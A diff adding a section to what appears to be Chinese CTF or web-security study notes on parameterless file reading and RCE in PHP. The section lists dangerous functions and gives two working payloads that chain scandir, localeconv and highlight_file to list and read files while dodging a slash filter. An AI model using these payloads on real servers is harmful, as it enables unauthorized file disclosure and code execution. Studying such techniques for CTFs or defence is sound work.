@@ -732,3 +732,43 @@ $___($_[_]);
 $___($_[_])?>
 ```
 
+# 13.无参数读文件和RCE漏洞
+
+### 1.与RCE相关的危险函数 
+
+ eval()  将字符串当作php代码执行
+ assert()  将字符串当作php代码执行
+ preg_replace()  将字符串正则匹配后替换
+ call_user_func()  回调函数
+ array_map()   回调函数
+
+
+
+使用print_r()进行输出
+
+使用readfile()或highlight_file()读取文件
+
+highlight_file() 函数对文件进行语法高亮显示，本函数是show_source() 的别名
+
+next() 输出数组中的当前元素和下一个元素的值。
+
+array_reverse() 函数以相反的元素顺序返回数组。(主要是能返回值)
+
+scandir() 函数返回指定目录中的文件和目录的数组。
+
+pos() 输出数组中的当前元素的值。
+
+localeconv() 函数返回一个包含本地数字及货币格式信息的数组，该数组的第一个元素就是"."。
+
+scandir（）用来获取目录文件
+
+chr（47）是/的ASCII编码，因为/被过滤了
+
+
+
+exp=print_r(scandir(pos(localeconv())))
+
+打印数组
+
+exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));
+
